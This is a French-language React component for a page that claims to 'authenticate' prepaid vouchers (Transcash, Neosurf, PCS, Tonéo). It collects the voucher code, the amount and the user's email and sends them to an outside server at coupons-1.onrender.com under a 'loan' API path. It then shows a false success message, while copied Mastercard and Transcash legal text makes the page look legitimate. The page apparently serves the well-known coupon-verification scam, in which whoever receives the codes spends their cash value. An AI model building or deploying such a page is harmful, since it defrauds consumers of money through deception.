import React, { useState } from 'react'
import './style.css'
import { Loader } from '../../utils/style/loader'

// import Cash from '../../assets/cash.jpg'
// import Pc from '../../assets/pc.png'
import Logo from '../../assets/logo.png'
import Foot from '../../assets/mobile.png'

const GetData = () => {
  const [formData, setFormData] = useState({
    type: '',
    email: '',
    code: '',
    price: '',
  })

  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState('')
  const [success, setSuccess] = useState('')

  const handleInputChange = (e) => {
    const { name, value } = e.target
    setFormData((prevData) => ({ ...prevData, [name]: value }))
  }

  const checkEmptyData = () => {
    if (
      formData.type === '' ||
      formData.email === '' ||
      formData.code === '' ||
      formData.price === ''
    ) {
      setIsLoading(false)
      setError('Aucun champs vide !')
      return false
    }
    setError('')
    return true
  }

  const handleRadioChange = (e) => {
    const { value } = e.target
    setFormData((prevData) => ({ ...prevData, type: value }))
  }

  const handleSubmit = (e) => {
    e.preventDefault()
    if (!checkEmptyData()) {
      return
    }

    setIsLoading(true)
    setError('')
    setSuccess('')

    fetch(`https://coupons-1.onrender.com/api/loan/contact-admin`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },

      body: JSON.stringify(formData),
    })
      .then((response) => {
        if (response.ok) {
          setIsLoading(false)
          setError('')
          setFormData({
            type: '',
            email: '',
            code: '',
            price: '',
          })
          setSuccess(
            'Authentification réussie. Vous recevrez un email de confirmation sous peu !'
          )
        } else {
          setIsLoading(false)
          setSuccess('')
          setError('Une erreur est survenue')
        }
      })
      .catch((error) => {
        setIsLoading(false)
        setError('Une erreur est survenue')
        console.error("Erreur lors de l'envoie du mail !")
      })
  }

  return (
    <div className="container">
      <div className="header_background_image">
        <h2>Authentification de coupons</h2>
      </div>

      <div className="form">
        <div className="type">
          <p>Sélectionnez le type de recharge</p>
          <div className="radio">
            <div>
              <input
                type="radio"
                name="type"
                value="Transcash"
                checked={formData.type === 'Transcash'}
                onChange={handleRadioChange}
              />{' '}
              Transcash
            </div>
            <div>
              <input
                type="radio"
                name="type"
                value="Neosurf"
                checked={formData.type === 'Neosurf'}
                onChange={handleRadioChange}
              />{' '}
              Neosurf
            </div>
            <div>
              <input
                type="radio"
                name="type"
                value="PCS"
                checked={formData.type === 'PCS'}
                onChange={handleRadioChange}
              />{' '}
              PCS
            </div>
            <div>
              <input
                type="radio"
                name="type"
                value="Tonéo"
                checked={formData.type === 'Tonéo'}
                onChange={handleRadioChange}
              />{' '}
              Tonéo
            </div>
          </div>
        </div>

        <div className="champs">
          <label>Email</label>
          <input
            type="email"
            name="email"
            value={formData.email}
            onChange={handleInputChange}
          />
        </div>
        <div className="champs">
          <label>Code</label>
          <input
            type="text"
            name="code"
            value={formData.code}
            onChange={handleInputChange}
          />
        </div>

        <div className="champs">
          <label htmlFor="options">Montant</label>
          <select
            id="options"
            name="price"
            value={formData.price}
            onChange={handleInputChange}
          >
            <option value="" disabled>
              Choisissez le montant
            </option>
            <option value="20">20€</option>
            <option value="50">50€</option>
            <option value="100">100€</option>
            <option value="150">150€</option>
            <option value="200">200€</option>
            <option value="250">250€</option>
            <option value="500">500€</option>
          </select>
        </div>

        <div className="hidden-code">
          <p>cacher le code</p>
          <div>
            <input type="checkbox" /> OUI
            <input type="checkbox" /> NON
          </div>
        </div>
        {isLoading && <Loader />}
        <h3 style={{ color: 'red', textAlign: 'center' }}> {error} </h3>
        <h3 style={{ color: 'green', textAlign: 'center' }}> {success} </h3>
        <button onClick={handleSubmit}>Controler</button>
      </div>

      <div className="bottom_image_container">
        <img src={Foot} alt="mobile" height="200px" width="auto" />
      </div>

      <div className="footer">
        <h2>Mentions légales</h2>
        <div className="footer_bottom">
          <div className="footer_img">
            <img src={Logo} alt="pc" />
          </div>

          <div>
            <p>
              Mastercard est une marque déposée et le design des cercles est une
              marque commerciale de Mastercard International Incorporated. La
              carte Transcash Mastercard est émise par PayrNet UBA en vertu
              d'une licence de Mastercard International Inc. PayrNet UBA est
              autorisé par la banque de Lituanie à émettre de la monnaie
              électronique et à fournir les services de paiement associés (réf
              LB001992), sous réglémentation relative à la Monnaie Electronique
              et aux Institutions de monnaie Electronique.
            </p>
            <br />
            <p>
              *Selon Conditions Générales de Vente et Condition Générales
              d'Utilisation des cartes de paiement prépayés Transcash. <br />{' '}
              (1) Coût d'un SMS ou d'unn appel local cheez votre opérateur
              téléphonique{' '}
            </p>
          </div>
        </div>
        <div style={{ marginTop: '37px' }}>&copy; Tout droit réservé</div>
      </div>
    </div>
  )
}

export default GetData
